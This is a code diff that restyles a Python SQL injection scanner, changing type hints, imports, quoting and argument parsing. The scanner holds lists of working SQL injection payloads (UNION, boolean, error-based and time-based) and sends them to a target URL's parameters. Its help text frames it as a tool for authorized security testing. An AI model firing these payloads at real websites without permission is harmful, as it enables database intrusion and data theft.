@@ -25,28 +25,25 @@ MITRE ATT&CK: T1190 (Exploit Public-Facing Application)
 """
 
 import argparse
-import sys
-import requests
-import urllib.parse
-from typing import Dict, Any, Optional, List, Tuple
-from enum import Enum
-import time
 import re
+import sys
+import time
+import urllib.parse
+from enum import Enum
+from typing import Any
 
-from utils.logger import get_logger
+import requests
+
 from utils.config import load_config
-from utils.helpers import (
-    validate_url,
-    check_authorization,
-    RateLimiter,
-    sanitize_filename
-)
+from utils.helpers import RateLimiter, check_authorization, sanitize_filename, validate_url
+from utils.logger import get_logger
 
 logger = get_logger(__name__)
 
 
 class InjectionType(Enum):
     """SQL injection types."""
+
     UNION = "union"
     BOOLEAN = "boolean"
     TIME_BASED = "time-based"
@@ -63,7 +60,7 @@ PAYLOADS = {
         "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
         "' UNION ALL SELECT NULL--",
         "' UNION ALL SELECT NULL,NULL--",
-        "\" UNION SELECT NULL--",
+        '" UNION SELECT NULL--',
         "1 UNION SELECT NULL--",
         "-1' UNION SELECT NULL,table_name FROM information_schema.tables--",
     ],
@@ -71,11 +68,11 @@ PAYLOADS = {
         "' OR '1'='1",
         "' OR '1'='1'--",
         "' OR 1=1--",
-        "\" OR \"1\"=\"1",
-        "\" OR 1=1--",
+        '" OR "1"="1',
+        '" OR 1=1--',
         "' OR 'a'='a",
         "') OR ('1'='1",
-        "\") OR (\"1\"=\"1",
+        '") OR ("1"="1',
         "' OR 'x'='x'--",
         "admin' --",
         "admin' #",
@@ -93,7 +90,7 @@ PAYLOADS = {
     ],
     InjectionType.ERROR_BASED: [
         "'",
-        "\"",
+        '"',
         "\\",
         "' AND 1=CONVERT(int,(SELECT @@version))--",
         "' AND 1=CAST((SELECT @@version) AS int)--",
@@ -141,7 +138,7 @@ class SQLInjectionScanner:
     Tests for various SQL injection types.
     """
 
-    def __init__(self, config: Optional[Dict[str, Any]] = None) -> None:
+    def __init__(self, config: dict[str, Any] | None = None) -> None:
         """
         Initialize SQL injection scanner.
 
@@ -153,13 +150,14 @@ class SQLInjectionScanner:
             self.config.get("rate_limit", {}).get("requests_per_second", 5)
         )
         self.session = requests.Session()
-        self.session.headers.update({
-            "User-Agent": self.config.get("http", {}).get(
-                "user_agent",
-                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-            )
-        })
-        self.vulnerabilities: List[Dict[str, Any]] = []
+        self.session.headers.update(
+            {
+                "User-Agent": self.config.get("http", {}).get(
+                    "user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+                )
+            }
+        )
+        self.vulnerabilities: list[dict[str, Any]] = []
         logger.info(f"Initialized {self.__class__.__name__}")
 
     def test_injection(
@@ -169,8 +167,8 @@ class SQLInjectionScanner:
         payload: str,
         injection_type: InjectionType,
         method: str = "GET",
-        data: Optional[Dict[str, str]] = None
-    ) -> Optional[Dict[str, Any]]:
+        data: dict[str, str] | None = None,
+    ) -> dict[str, Any] | None:
         """
         Test a single SQL injection payload.
 
@@ -198,7 +196,14 @@ class SQLInjectionScanner:
                 params[param] = [payload]
                 new_query = urllib.parse.urlencode(params, doseq=True)
                 test_url = urllib.parse.urlunparse(
-                    (parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment)
+                    (
+                        parsed.scheme,
+                        parsed.netloc,
+                        parsed.path,
+                        parsed.params,
+                        new_query,
+                        parsed.fragment,
+                    )
                 )
 
                 start_time = time.time()
@@ -215,9 +220,7 @@ class SQLInjectionScanner:
                 elapsed_time = time.time() - start_time
 
             # Check for vulnerability
-            vuln = self._check_vulnerability(
-                response, elapsed_time, injection_type, payload, param
-            )
+            vuln = self._check_vulnerability(response, elapsed_time, injection_type, payload, param)
 
             if vuln:
                 logger.warning(f"Potential SQLi found: {injection_type.value} in {param}")
@@ -232,7 +235,7 @@ class SQLInjectionScanner:
                     "parameter": param,
                     "payload": payload,
                     "evidence": "Request timeout (possible time-based injection)",
-                    "confidence": "medium"
+                    "confidence": "medium",
                 }
         except Exception as e:
             logger.debug(f"Error testing {param} with {payload}: {e}")
@@ -245,8 +248,8 @@ class SQLInjectionScanner:
         elapsed_time: float,
         injection_type: InjectionType,
         payload: str,
-        param: str
-    ) -> Optional[Dict[str, Any]]:
+        param: str,
+    ) -> dict[str, Any] | None:
         """
         Check if response indicates vulnerability.
 
@@ -269,7 +272,7 @@ class SQLInjectionScanner:
                         "parameter": param,
                         "payload": payload,
                         "evidence": f"SQL error pattern detected: {error_pattern}",
-                        "confidence": "high"
+                        "confidence": "high",
                     }
 
         # Time-based detection
@@ -280,7 +283,7 @@ class SQLInjectionScanner:
                     "parameter": param,
                     "payload": payload,
                     "evidence": f"Response time: {elapsed_time:.2f}s (expected delay)",
-                    "confidence": "high"
+                    "confidence": "high",
                 }
 
         # Boolean-based detection (requires baseline comparison)
@@ -293,7 +296,7 @@ class SQLInjectionScanner:
                     "parameter": param,
                     "payload": payload,
                     "evidence": "Response indicates possible boolean-based SQLi (requires manual verification)",
-                    "confidence": "low"
+                    "confidence": "low",
                 }
 
         # Union-based detection
@@ -305,7 +308,7 @@ class SQLInjectionScanner:
                     "parameter": param,
                     "payload": payload,
                     "evidence": "Response contains UNION-related data",
-                    "confidence": "medium"
+                    "confidence": "medium",
                 }
 
         return None
@@ -313,11 +316,11 @@ class SQLInjectionScanner:
     def scan_url(
         self,
         url: str,
-        params: Optional[List[str]] = None,
-        injection_types: Optional[List[InjectionType]] = None,
+        params: list[str] | None = None,
+        injection_types: list[InjectionType] | None = None,
         method: str = "GET",
-        data: Optional[Dict[str, str]] = None
-    ) -> List[Dict[str, Any]]:
+        data: dict[str, str] | None = None,
+    ) -> list[dict[str, Any]]:
         """
         Scan URL for SQL injection vulnerabilities.
 
@@ -365,7 +368,7 @@ class SQLInjectionScanner:
                     vuln = self.test_injection(url, param, payload, inj_type, method, data)
                     if vuln:
                         vulnerabilities.append(vuln)
-                        print(f"        [+] Potential vulnerability found!")
+                        print("        [+] Potential vulnerability found!")
                         # Only report first finding per parameter/type combination
                         break
 
@@ -374,11 +377,11 @@ class SQLInjectionScanner:
     def run(
         self,
         url: str,
-        params: Optional[List[str]] = None,
+        params: list[str] | None = None,
         test_all_types: bool = False,
         method: str = "GET",
-        data: Optional[Dict[str, str]] = None
-    ) -> Dict[str, Any]:
+        data: dict[str, str] | None = None,
+    ) -> dict[str, Any]:
         """
         Execute SQL injection scan.
 
@@ -420,7 +423,7 @@ class SQLInjectionScanner:
             "parameters_tested": params or "auto-detected",
             "injection_types": [t.value for t in injection_types],
             "vulnerabilities_found": len(vulnerabilities),
-            "vulnerabilities": vulnerabilities
+            "vulnerabilities": vulnerabilities,
         }
 
         logger.info(f"Scan complete: {len(vulnerabilities)} vulnerabilities found")
@@ -428,7 +431,7 @@ class SQLInjectionScanner:
 
         return results
 
-    def _save_results(self, results: Dict[str, Any]) -> None:
+    def _save_results(self, results: dict[str, Any]) -> None:
         """
         Save scan results to output directory.
 
@@ -436,8 +439,8 @@ class SQLInjectionScanner:
             results: Results dictionary to save
         """
         import json
-        from pathlib import Path
         from datetime import datetime
+        from pathlib import Path
 
         output_dir = Path(self.config.get("output", {}).get("directory", "output"))
         output_dir.mkdir(exist_ok=True)
@@ -464,49 +467,27 @@ def main() -> int:
     """
     parser = argparse.ArgumentParser(
         description="SQL Injection Scanner - Automated SQLi Detection\n"
-                    "[!] For authorized security testing only",
-        formatter_class=argparse.RawDescriptionHelpFormatter
+        "[!] For authorized security testing only",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
     )
 
-    parser.add_argument(
-        "--url",
-        required=True,
-        help="Target URL to scan"
-    )
+    parser.add_argument("--url", required=True, help="Target URL to scan")
+
+    parser.add_argument("--param", help="Specific parameter to test")
 
     parser.add_argument(
-        "--param",
-        help="Specific parameter to test"
+        "--method", default="GET", choices=["GET", "POST"], help="HTTP method (default: GET)"
     )
 
-    parser.add_argument(
-        "--method",
-        default="GET",
-        choices=["GET", "POST"],
-        help="HTTP method (default: GET)"
-    )
+    parser.add_argument("--data", help="POST data in format key1=value1&key2=value2")
 
     parser.add_argument(
-        "--data",
-        help="POST data in format key1=value1&key2=value2"
+        "--all-types", action="store_true", help="Test all injection types (including time-based)"
     )
 
-    parser.add_argument(
-        "--all-types",
-        action="store_true",
-        help="Test all injection types (including time-based)"
-    )
+    parser.add_argument("--config", help="Path to configuration file")
 
-    parser.add_argument(
-        "--config",
-        help="Path to configuration file"
-    )
-
-    parser.add_argument(
-        "--verbose", "-v",
-        action="store_true",
-        help="Enable verbose output"
-    )
+    parser.add_argument("--verbose", "-v", action="store_true", help="Enable verbose output")
 
     args = parser.parse_args()
 
@@ -516,6 +497,7 @@ def main() -> int:
     # Set log level
     if args.verbose:
         from utils.logger import set_log_level
+
         set_log_level(logger, "DEBUG")
 
     print("\n" + "=" * 70)
@@ -534,27 +516,21 @@ def main() -> int:
     params = [args.param] if args.param else None
 
     # Run scan
-    results = scanner.run(
-        args.url,
-        params,
-        args.all_types,
-        args.method,
-        post_data
-    )
+    results = scanner.run(args.url, params, args.all_types, args.method, post_data)
 
     if "error" in results:
         print(f"\n[-] Error: {results['error']}")
         return 1
 
     # Print summary
-    print(f"\n[+] Scan Summary:")
+    print("\n[+] Scan Summary:")
     print(f"    URL: {results['url']}")
     print(f"    Method: {results['method']}")
     print(f"    Injection Types: {', '.join(results['injection_types'])}")
     print(f"    Vulnerabilities Found: {results['vulnerabilities_found']}")
 
     if results["vulnerabilities"]:
-        print(f"\n[+] Vulnerabilities:")
+        print("\n[+] Vulnerabilities:")
         for vuln in results["vulnerabilities"]:
             print(f"\n    Type: {vuln['type']}")
             print(f"    Parameter: {vuln['parameter']}")
@@ -562,7 +538,7 @@ def main() -> int:
             print(f"    Evidence: {vuln['evidence']}")
             print(f"    Confidence: {vuln['confidence']}")
     else:
-        print(f"\n[+] No SQL injection vulnerabilities detected")
+        print("\n[+] No SQL injection vulnerabilities detected")
 
     return 0
 
